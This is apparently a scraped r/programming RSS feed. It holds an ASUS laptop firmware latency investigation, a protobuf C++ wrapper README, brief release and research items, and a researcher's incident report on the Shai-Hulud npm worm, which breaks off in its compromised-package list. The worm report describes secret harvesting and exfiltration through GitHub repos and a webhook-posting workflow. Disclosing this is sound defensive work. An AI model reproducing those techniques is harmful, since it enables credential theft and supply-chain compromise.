on"</span> <span>If</span> ((<span>Arg2</span> == <span>0x06</span>)) { <span>// Wake everything back up</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DGCE)) { ^^PC00.PEG1.DGCE = <span>Zero</span> <span>// Clear "GPU Cut Enable"</span> } <span>If</span> (S0ID == <span>One</span>) { GUAM (<span>Zero</span>) <span>// Exit low power mode</span> } ^^PC00.DPOF = <span>Zero</span> <span>// Display power on flag</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x06</span>) } } } }</pre></div><p>Once again, the firmware prepares to cut power to the discrete GPU without first checking if it's the only GPU driving the displays. This demonstrates that the Mux Mode Confusion is a systemic design flaw. The firmware is internally inconsistent, leading it to issue self-destructive commands that try to cripple the system.</p><h2>Cross-System Analysis</h2><a href="https://github.com#cross-system-analysis"></a><p>Traces from multiple ASUS gaming laptop models confirm this is not an isolated issue.</p><h4>Scar 15 Analysis</h4><a href="https://github.com#scar-15-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 4.1 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 7</li> <li><strong>Avg. GPE Duration:</strong> 1.56ms (lower, but still unacceptably high)</li> <li><strong>Avg. Interval:</strong> 39.4 seconds (nearly identical periodic nature)</li> <li><strong>GPU Power Cycles:</strong> 8</li> </ul><p></p><h4>Zephyrus M16 Analysis</h4><a href="https://github.com#zephyrus-m16-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 19.9 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 3</li> <li><strong>Avg. GPE Duration:</strong> 2.94ms</li> <li><strong>GPU Power Cycles:</strong> 197 (far more frequent)</li> <li><strong>ASUS WMI Calls:</strong> 2,370 (a massive number, indicating software amplification)</li> </ul><p>Microsoft has a built-in "smooth video" check. It plays HD video in full screen and watches for hiccups. If the PC drops frames, crackles, or any driver pauses for more than a few milliseconds, it fails. That&rsquo;s Microsoft&rsquo;s baseline for what "smooth" should look like.</p><p>Why it matters here:</p><p>ASUS firmware is causing millisecond-long pauses. Those pauses are exactly the kind that make this test fail i.e., the same stutters and audio pops regular users notice on YouTube/Netflix and games; this firmware violates fundemental standards.</p><h3>The Universal Pattern</h3><a href="https://github.com#the-universal-pattern"></a><p>Despite being different models, all affected systems exhibit the same core flaws:</p><ol> <li><code>_GPE._L02</code> handlers take milliseconds to execute instead of microseconds.</li> <li>The GPEs trigger unnecessary battery polling.</li> <li>The firmware attempts to power cycle the GPU while in a fixed MUX mode.</li> <li>The entire process is driven by a periodic, timer-like trigger.</li> </ol> <h2>Summarizing the Findings</h2><a href="https://github.com#summarizing-the-findings"></a><p>This bug is a cascade of firmware design failures.</p><h3>Root Cause 1: The Misunderstanding of Interrupt Context</h3><a href="https://github.com#root-cause-1-the-misunderstanding-of-interrupt-context"></a><p>On windows, the LXX / EXX run at PASSIVE_LEVEL via ACPI.sys but while a GPE control method runs <strong>the firing GPE stays masked</strong> and ACPI/EC work is <strong>serialized</strong>. ASUS's dispatch from GPE._L02 to ECLV loops, calls Sleep(25/100ms) and re-arms the EC stretching that masked window into tens of milliseconds (which would explain the 13ms CPU time in ETW (Kernel ms) delay for GPE Events) and producing a periodic ACPI.sys burst that causes the latency problems on the system.The correct behavior is to latch or clear the event, exit the method, and signal a driver with Notify for any heavy work; do not self-rearm or sleep in this path at all.</p><h3>Root Cause 2: Flawed Interrupt Handling</h3><a href="https://github.com#root-cause-2-flawed-interrupt-handling"></a><p>The firmware artificially re-arms the interrupt, creating an endless loop of GPEs instead of clearing the source and waiting for the next legitimate hardware event. This transforms a hardware notification system into a disruptive, periodic timer.</p><h3>Root Cause 3: Lack of Platform Awareness</h3><a href="https://github.com#root-cause-3-lack-of-platform-awareness"></a><p>The code that sends GPU power notifications does not check if the system is in MUX mode, a critical state check that is correctly performed in other parts of the firmware. This demonstrates inconsistency and a lack of quality control.</p><h2>Timeline of User Reports</h2><a href="https://github.com#timeline-of-user-reports"></a><p></p><h3>The Three-Year Pattern</h3><a href="https://github.com#the-three-year-pattern"></a><p>This issue is not new or isolated. User reports documenting identical symptoms with high ACPI.sys DPC latency, periodic stuttering, and audio crackling have been accumulating since at least 2021 across ASUS's entire gaming laptop lineup.</p><p><strong>August 2021: The First Major Reports</strong><br> The earliest documented cases appear on the official ASUS ROG forums. A G15 Advantage Edition (G513QY) owner reports <a href="https://rog-forum.asus.com/t5/rog-strix-series/g15-advantage-edition-g513qy-severe-dpc-latency-audio-dropouts/m-p/809512">"severe DPC latency from ACPI.sys"</a> with audio dropouts occurring under any load condition. The thread, last edited in March 2024, shows the issue remains unresolved after nearly three years.</p><p>Reddit users simultaneously report <a href="https://www.reddit.com/r/ASUS/comments/odprtv/high_dpc_latency_from_acpisys_can_be_caused_by/">identical ACPI.sys latency problems</a> alongside NVIDIA driver issues; the exact symptoms described in this investigation.</p><p><strong>2021-2023: Spreading Across Models</strong><br> Throughout this period, the issue proliferates across ASUS's gaming lineup:</p><ul> <li><a href="https://www.reddit.com/r/techsupport/comments/mxtm86/i_need_help_high_acpisys_latency_and_microstutters/">ROG Strix models experience micro-stutters</a></li> <li><a href="https://www.reddit.com/r/Asustuf/comments/1m2e40v/my_laptop_throttling_for_few_seconds/">TUF Gaming series reports throttling for seconds at a time</a></li> <li><a href="https://www.reddit.com/r/techsupport/comments/17rqfq5/new_laptop_started_stuttering_every_45_seconds/">G18 models exhibit the characteristic 45-second periodic stuttering</a></li> </ul><p><strong>2023-2024: The Problem Persists in New Models</strong><br> Even the latest generations aren't immune:</p><ul> <li><a href="https://www.reddit.com/r/ZephyrusM16/comments/1j33ld6/this_machine_has_been_nothing_but_problems_no/">2023 Zephyrus G16 owners report persistent audio issues</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1l4jb13/audio_popscrackles_on_zephyrus_g16_2023/">2023 G16 models continue experiencing audio pops/crackles</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1i2w9ah/resolving_audio_popsstuttering_on_2024_intel_g16/">2024 Intel G16 models require workarounds for audio stuttering</a></li> </ul> <h2>Conclusion</h2><a href="https://github.com#conclusion"></a><p>The evidence is undeniable:</p><ul> <li><strong>Measured Proof:</strong> GPE handlers are measured blocking a CPU core for over 13 milliseconds.</li> <li><strong>Code Proof:</strong> The decompiled firmware explicitly contains <code>Sleep()</code> calls within an interrupt handler.</li> <li><strong>Logical Proof:</strong> The code lacks critical checks for the laptop's hardware state (MUX mode).</li> <li><strong>Systemic Proof:</strong> The issue is reproducible across different models and BIOS versions.</li> </ul><p>Until a fix is implemented, millions of buyers of Asus laptops from approx. 2021 to present day are facing stutters on the simplest of tasks, such as watching YouTube, for the simple mistake of using a sleep call inside of an inefficient interrupt handler and not checking the GPU environment properly.</p><p>The code is there. The traces prove it. ASUS must fix its firmware.</p><blockquote><p>ASUS has not responded to this investigation or the documented firmware issues at the time of publication, will update this if anything changes.</p></blockquote> <hr><p><em>Investigation conducted using the Windows Performance Toolkit, ACPI table extraction tools, and Intel ACPI Component Architecture utilities. All code excerpts are from official ASUS firmware. Traces were captured on multiple affected systems, all showing consistent behavior. I used an LLM for wording. The research, traces, and AML decomp are mine. Every claim is verified and reproducible if you follow the steps in the article; logs and commands are in the repo. If you think something's wrong, cite the exact timestamp/method/line. "AI wrote it" is not an argument.</em></p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 05:38:51 +0530</pubDate></item><item><link>https://github.com/illegal-instruction-co/sugar-proto</link><title>A new experiment: making Protobuf in C++ less painful (inspired by the old “why is Protobuf so clunky?” thread) (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</guid><comments>https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey folks,</p><p>Some hours back there was a lively discussion here: <a href="https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/">Why is Protobuf’s C API so clunky?</a></p><p>I was in that thread too, tossing around ideas like <em>“what if we could do</em> <code>user[&quot;id&quot;] = 123;</code> <em>and have it fail at compile time if you tried</em> <code>user[&quot;id&quot;] = &quot;oops&quot;;</code><em>”</em>. The feedback I got there was super helpful — a few people pointed out I was basically forcing JSON-style dynamics into a static Protobuf world, which doesn’t really fit. That clicked with me.</p><p>Since then I hacked on a small library/plugin called <strong>Sugar-Proto</strong>. It’s a protoc plugin that generates wrappers around your <code>.proto</code> messages, giving you something closer to a <code>nlohmann/json</code> feel, but still 100% type-safe and zero runtime reflection.</p><p>Example:</p><pre><code>User user;UserWrapped u(user);u.name = &quot;Alice&quot;;u.id = 42;u.posts.push_back({{&quot;title&quot;, &quot;Hello&quot;}, {&quot;comments&quot;, {{&quot;text&quot;, &quot;Nice!&quot;}}}});</code></pre><p>Under the hood it’s just normal protobuf fields, no hidden runtime map lookups. The idea is: <strong>make the API less clunky without pretending it’s JSON.</strong></p><p>It’s early, not production-ready yet, but I’d love for people to kick the tires and tell me what feels right/wrong.</p><p>Curious to hear if anyone else tried wrapping protobuf in a more ergonomic C++ way. Do you think this direction has legs, or is protobuf doomed to always feel a bit Java-ish in C++?</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/1337735e66765d1aef5640abdd95c817a0b7c9360df1d12312a03a8fd567be11/illegal-instruction-co/sugar-proto' /></section><section class='parsed-content'><div><article><h2>sugar-proto</h2><a href="https://github.com#sugar-proto"></a><p><code>sugar-proto</code> is a lightweight wrapper and plugin for Protocol Buffers. The main goal is to make working with protobuf in C++ feel simpler and more intuitive, closer to plain struct and stl like APIs.</p><h2>Why</h2><a href="https://github.com#why"></a><p>Using the default protobuf C++ API can feel verbose and rigid. With sugar-proto, you can interact with your messages in a much friendlier way, for example:</p><div><pre>u.id = <span>123</span>; u.tags.push_back(<span><span>"</span>cpp<span>"</span></span>); u.profile.city = <span><span>"</span>Berlin<span>"</span></span>; cout &lt;&lt; u.id &lt;&lt; endl; cout &lt;&lt; u.tags[] &lt;&lt; endl; cout &lt;&lt; u.profile.city &lt;&lt; endl;</pre></div><p>Instead of juggling with reflection and getters/setters everywhere, you get a concise and readable interface.</p><h2>Installation</h2><a href="https://github.com#installation"></a><p>Build and install with:</p><div><pre>git clone https://github.com/illegal-instruction-co/sugar-proto.git <span>cd</span> sugar-proto mkdir build <span>&amp;&amp;</span> <span>cd</span> build cmake .. make -j sudo make install</pre></div><p>After installation:</p><ul> <li>The plugin binary will be placed at <code>/usr/local/bin/protoc-gen-sugar</code></li> <li>The runtime header will be installed at <code>/usr/local/include/sugar/sugar_runtime.h</code></li> <li>CMake config files will be available so you can simply use <code>find_package(sugar-proto REQUIRED)</code> in your own projects</li> </ul> <h2>Usage</h2><a href="https://github.com#usage"></a><p>In your project&rsquo;s <code>CMakeLists.txt</code>:</p><div><pre><span>find_package</span>(<span>Protobuf</span> <span>REQUIRED</span>) <span>find_package</span>(<span>sugar-proto</span> <span>REQUIRED</span>) <span>set</span>(<span>PROTO_FILE</span> <span>${CMAKE_SOURCE_DIR}</span><span>/my.proto</span>) <span>set</span>(<span>GENERATED_DIR</span> <span>${CMAKE_BINARY_DIR}</span><span>/generated</span>) <span>file</span>(<span>MAKE_DIRECTORY</span> <span>${GENERATED_DIR}</span>) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> <span>${GENERATED_DIR}</span><span>/my.pb.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--cpp_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.sugar.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--sugar_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_executable</span>(<span>my_app</span> <span>main.cpp</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> ) <span>target_include_directories</span>(<span>my_app</span> <span>PRIVATE</span> <span>${GENERATED_DIR}</span>) <span>target_link_libraries</span>(<span>my_app</span> <span>PRIVATE</span> <span>Protobuf::libprotobuf</span>)</pre></div><h2>Example Code</h2><a href="https://github.com#example-code"></a><div>int main() { MyMessage msg; MyMessageWrapped u(msg); u.id = 42; u.name = "hello world"; u.tags.push_back("first"); u.tags.push_back("test"); std::cout &lt;&lt; msg.DebugString() &lt;&lt; std::endl; std::cout &lt;&lt; u.id &lt;&lt; std::endl; std::cout &lt;&lt; u.name &lt;&lt; std::endl; return 0; }"&gt;<pre>#<span>include</span> <span><span>"</span>my.pb.h<span>"</span></span> #<span>include</span> <span><span>"</span>my.sugar.h<span>"</span></span> #<span>include</span> <span><span>&lt;</span>iostream<span>&gt;</span></span> <span>int</span> <span>main</span>() { MyMessage msg; MyMessageWrapped <span>u</span>(msg); u.<span>id</span> = <span>42</span>; u.<span>name</span> = <span><span>"</span>hello world<span>"</span></span>; u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>first<span>"</span></span>); u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>test<span>"</span></span>); std::cout &lt;&lt; msg.<span>DebugString</span>() &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>id</span> &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>name</span> &lt;&lt; std::endl; <span>return</span> ; }</pre></div><p></p><h2>Notes</h2><a href="https://github.com#notes"></a> <ul> <li>Minimum required CMake version is 3.16 (recommended 3.21 or newer)</li> <li>Currently supports: scalar fields, repeated fields, maps, and oneofs</li> <li>API is not considered stable yet, small breaking changes may occur</li> </ul><p>If you run into issues or missing features, please open an issue. The ultimate goal is to make protobuf usage in C++ enjoyable and developer friendly.</p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 03:21:04 +0530</pubDate></item><item><link>https://www.swift.org/blog/swift-6.2-released/</link><title>Swift 6.2 Released (swift.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</guid><comments>https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/'>Post permalink</a></p></section>]]></description><pubDate>Wed, 17 Sep 2025 01:12:42 +0530</pubDate></item><item><link>https://medium.com/techtofreedom/google-ends-support-for-pytype-this-is-how-python-developers-can-adapt-a703d964028a?sk=e228cb9233d3e5fa91d3757c1946ad24</link><title>Google Ends Support for Pytype: This is How Python Developers Can Adapt (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</guid><comments>https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><h2>Google Ends Support for Pytype: This is How Python Developers Can Adapt</h2><div><h2>And what it says about the evolution of Python typing.</h2></div><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption>Image from <a href="https://wallhaven.cc/w/m992d8">Wallhaven</a></figcaption></figure><p>After years of maintaining Pytype, Google has <a href="https://github.com/google/pytype/blob/main/README.md">officially announced</a> that it is sunsetting the project, and the last supported Python version is 3.12.</p><p>As an ambitious type-checking tool for Python, Pytype was popular, especially when Python&rsquo;s type hints syntax wasn&rsquo;t comprehensive enough.</p><p>While the news might not come as a surprise given the rapid evolution of Python typing tools, it does raise important questions about the ecosystem and the direction of type checking in Python. As Python developers, we should adapt to the rapid changes to enhance our skills.</p><p>This article will help you understand what this move means and how it will affect you.</p><h2>What Was Pytype?</h2><p>Pytype was Google&rsquo;s in-house tool developed since 2012. As a handy type analysis tool, Pytype could:</p><ul><li>Infer types without explicit type hints.</li><li>Detect type errors across large codebases.</li><li>Generate type stubs for libraries lacking type information.</li><li>Provide flexible integration for teams with legacy Python code.</li></ul></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/2*LGEGZoQWcwrCYPOxGsacCg.jpeg"></p></div></section>]]></description><pubDate>Wed, 17 Sep 2025 00:38:51 +0530</pubDate></item><item><link>https://mail.openjdk.org/pipermail/announce/2025-September/000360.html</link><title>Java 25 / JDK 25: General Availability (mail.openjdk.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</guid><comments>https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/'>Post permalink</a></p></section>]]></description><pubDate>Tue, 16 Sep 2025 21:15:12 +0530</pubDate></item><item><link>https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555</link><title>Generative AI is hollowing out entry-level jobs, study finds (papers.ssrn.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</guid><comments>https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.ssrn.com/ssrn-global-header/11589acb53bc518aa22929bf19add113.svg' /></section><section class='parsed-content'><div><p><span>35 Pages</span> <span>Posted: 8 Sep 2025</span> </p><p>Date Written: August 31, 2025</p><div><h3>Abstract</h3><p>We study whether generative artificial intelligence (AI) constitutes a form of <i>seniority-biased technological change</i>, disproportionately affecting junior relative to senior workers. Using U.S. r&eacute;sum&eacute; and job posting data covering nearly 62 million workers in 285,000 firms (2015-2025), we track within-firm employment dynamics by seniority. We identify AI adoption through a text-analysis approach that flags postings for dedicated "AI integrator" roles, signaling active implementation of generative AI. Difference-in-differences and triple-difference estimates show that, beginning in 2023Q1, junior employment in adopting firms declined sharply relative to non-adopters, while senior employment continued to rise. The junior decline is driven primarily by slower hiring rather than increased separations, with the largest effects in wholesale and retail trade. Heterogeneity by education reveals a U-shaped pattern: mid-tier graduates see the largest declines, while elite and low-tier graduates are less affected. Overall, the results provide early evidence of a seniority-biased impact of AI adoption and its mechanisms. </p></div><center> </center><p><strong>Keywords:</strong> Generative AI, Technological Change, Generative Artificial Intelligence, Labor Market, AI Adoption, Job Postings, R&eacute;sum&eacute; Data, Career Ladders, Entry-Level Employment, United States labor market</p><p><strong>JEL Classification:</strong> J24, J31, J63, O33, L23</p><p><strong>Suggested Citation:</strong> <a href="https://papers.ssrn.com#">Suggested Citation<i></i></a> </p><p>Lichtinger, Guy and Hosseini Maasoum, Seyed Mahdi and Hosseini Maasoum, Seyed Mahdi, Generative AI as Seniority-Biased Technological Change: Evidence from U.S. R&eacute;sum&eacute; and Job Posting Data (August 31, 2025). Available at SSRN: <a href="https://ssrn.com/abstract=5425555">https://ssrn.com/abstract=5425555</a> or <a href="https://dx.doi.org/10.2139/ssrn.5425555">http://dx.doi.org/10.2139/ssrn.5425555 </a> </p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 20:44:33 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/s1ngularity-nx-attackers-strike-again</link><title>Crowdstrike Packages Infected with Malware (and other 167 packages infected as well) (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</guid><comments>https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 19 min | <a href='https://www.reddit.com/r/programming/comments/1nihrpt/crowdstrike_packages_infected_with_malware_and/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>sigh.... Kinda getting sick of writing these, absolutely insane the pace of supply chain attacks anyway...<br/>The same ThreatActors behind the NX S1ngularity attack have launched a self-replicating worm, it&#39;s infected 187 packages and its terrifying.</p><p>Yesterday a software developer  <a href="https://www.linkedin.com/in/daniel-pereira-b17a27160/">Daniel Pereira </a>noticed a weird repo being created.... when he looked into it he was the first to realize that actually <a href="https://www.npmjs.com/package/@ctrl/tinycolor">tinycolor </a>was infected with malware. He reached out to multiple people, no one took him seriously until he reached out to Socket who discovered that <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">40 packages were compromised</a>.</p><p>Fun story, a little concerning but honestly this happens a lot so it&#39;s not crazy.... But then it got worse, so much worse.</p><p>When I woke up, our lead researcher Charlie Erikson had discovered that actually a total of 187 packages were compromised (147 more than Socket had reported) 20 of which were from Crowdstrike.</p><p>What does the worm do</p><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets — process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.</li><li><strong>Exfiltrate (1) — GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.</li><li><strong>Exfiltrate (2) — GitHub Actions → webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.</li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).</li><li><strong>Amplify</strong>: iterates the victim’s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>Its already turned <a href="https://github.com/search?q=Shai-Hulud+Migration&amp;ref=opensearch&amp;type=repositories&amp;s=updated&amp;o=asc">700 previously private repositories public</a>  This number will go down as they are removed by maintainers</p><p>if you remeber the S1ngularity breach this is the exact same type of attacker and 100% the same attackers.</p><p>The questions I have from that attack remain.... I have no idea why they are exfiltrating secrets to Public GitHub repos and not a private C2 servers (other than to cause chaos)</p><p>The malicious versions have since been removed by Crowdstrikes account. Here is a total list of the packages compromised and their versions</p><table><thead><tr><th>@ahmedhfarag/ngx-perfect-scrollbar</th><th>20.0.20</th></tr></thead><tbody><tr><td>@ahmedhfarag/ngx-virtual-scroller</td><td>4.0.4</td></tr><tr><td>@art-ws/common</td><td>2.0.28</td></tr><tr><td>@art-ws/config-eslint</td><td>2.0.4, 2.0.5</td></tr><tr><td>@art-ws/config-ts</td><td>2.0.7, 2.0.8</td></tr><tr><td>@art-ws/db-context</td><td>2.0.24</td></tr><tr><td>@art-ws/di</td><td>2.0.28, 2.0.32</td></tr><tr><td>@art-ws/di-node</td><td>2.0.13</td></tr><tr><td>@art-ws/eslint</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/fastify-http-server</td><td>2.0.24, 2.0.27</td></tr><tr><td>@art-ws/http-server</td><td>2.0.21, 2.0.25</td></tr><tr><td>@art-ws/openapi</td><td>0.1.9, 0.1.12</td></tr><tr><td>@art-ws/package-base</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/prettier</td><td>1.0.5, 1.0.6</td></tr><tr><td>@art-ws/slf</td><td>2.0.15, 2.0.22</td></tr><tr><td>@art-ws/ssl-info</td><td>1.0.9, 1.0.10</td></tr><tr><td>@art-ws/web-app</td><td>1.0.3, 1.0.4</td></tr><tr><td>@crowdstrike/commitlint</td><td>8.1.1, 8.1.2</td></tr><tr><td>@crowdstrike/falcon-shoelace</td><td>0.4.1, 0.4.2</td></tr><tr><td>@crowdstrike/foundry-js</td><td>0.19.1, 0.19.2</td></tr><tr><td>@crowdstrike/glide-core</td><td>0.34.2, 0.34.3</td></tr><tr><td>@crowdstrike/logscale-dashboard</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-file-editor</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-parser-edit</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/logscale-search</td><td>1.205.1, 1.205.2</td></tr><tr><td>@crowdstrike/tailwind-toucan-base</td><td>5.0.1, 5.0.2</td></tr><tr><td>@ctrl/deluge</td><td>7.2.1, 7.2.2</td></tr><tr><td>@ctrl/golang-template</td><td>1.4.2, 1.4.3</td></tr><tr><td>@ctrl/magnet-link</td><td>4.0.3, 4.0.4</td></tr><tr><td>@ctrl/ngx-codemirror</td><td>7.0.1, 7.0.2</td></tr><tr><td>@ctrl/ngx-csv</td><td>6.0.1, 6.0.2</td></tr><tr><td>@ctrl/ngx-emoji-mart</td><td>9.2.1, 9.2.2</td></tr><tr><td>@ctrl/ngx-rightclick</td><td>4.0.1, 4.0.2</td></tr><tr><td>@ctrl/qbittorrent</td><td>9.7.1, 9.7.2</td></tr><tr><td>@ctrl/react-adsense</td><td>2.0.1, 2.0.2</td></tr><tr><td>@ctrl/shared-torrent</td><td>6.3.1, 6.3.2</td></tr><tr><td>@ctrl/tinycolor</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/torrent-file</td><td>4.1.1, 4.1.2</td></tr><tr><td>@ctrl/transmission</td><td>7.3.1</td></tr><tr><td>@ctrl/ts-base32</td><td>4.0.1, 4.0.2</td></tr><tr><td>@hestjs/core</td><td>0.2.1</td></tr><tr><td>@hestjs/cqrs</td><td>0.1.6</td></tr><tr><td>@hestjs/demo</td><td>0.1.2</td></tr><tr><td>@hestjs/eslint-config</td><td>0.1.2</td></tr><tr><td>@hestjs/logger</td><td>0.1.6</td></tr><tr><td>@hestjs/scalar</td><td>0.1.7</td></tr><tr><td>@hestjs/validation</td><td>0.1.6</td></tr><tr><td>@nativescript-community/arraybuffers</td><td>1.1.6, 1.1.7, 1.1.8</td></tr><tr><td>@nativescript-community/gesturehandler</td><td>2.0.35</td></tr><tr><td>@nativescript-community/perms</td><td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td></tr><tr><td>@nativescript-community/sqlite</td><td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td></tr><tr><td>@nativescript-community/text</td><td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td></tr><tr><td>@nativescript-community/typeorm</td><td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td></tr><tr><td>@nativescript-community/ui-collectionview</td><td>6.0.6</td></tr><tr><td>@nativescript-community/ui-document-picker</td><td>1.1.27, 1.1.28</td></tr><tr><td>@nativescript-community/ui-drawer</td><td>0.1.30</td></tr><tr><td>@nativescript-community/ui-image</td><td>4.5.6</td></tr><tr><td>@nativescript-community/ui-label</td><td>1.3.35, 1.3.36, 1.3.37</td></tr><tr><td>@nativescript-community/ui-material-bottom-navigation</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-bottomsheet</td><td>7.2.72</td></tr><tr><td>@nativescript-community/ui-material-core</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-core-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-ripple</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-material-tabs</td><td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td></tr><tr><td>@nativescript-community/ui-pager</td><td>14.1.36, 14.1.37, 14.1.38</td></tr><tr><td>@nativescript-community/ui-pulltorefresh</td><td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td></tr><tr><td>@nexe/config-manager</td><td>0.1.1</td></tr><tr><td>@nexe/eslint-config</td><td>0.1.1</td></tr><tr><td>@nexe/logger</td><td>0.1.3</td></tr><tr><td>@nstudio/angular</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/focus</td><td>20.0.4, 20.0.5, 20.0.6</td></tr><tr><td>@nstudio/nativescript-checkbox</td><td>2.0.6, 2.0.7, 2.0.8, 2.0.9</td></tr><tr><td>@nstudio/nativescript-loading-indicator</td><td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td></tr><tr><td>@nstudio/ui-collectionview</td><td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td></tr><tr><td>@nstudio/web</td><td>20.0.4</td></tr><tr><td>@nstudio/web-angular</td><td>20.0.4</td></tr><tr><td>@nstudio/xplat</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@nstudio/xplat-utils</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@operato/board</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 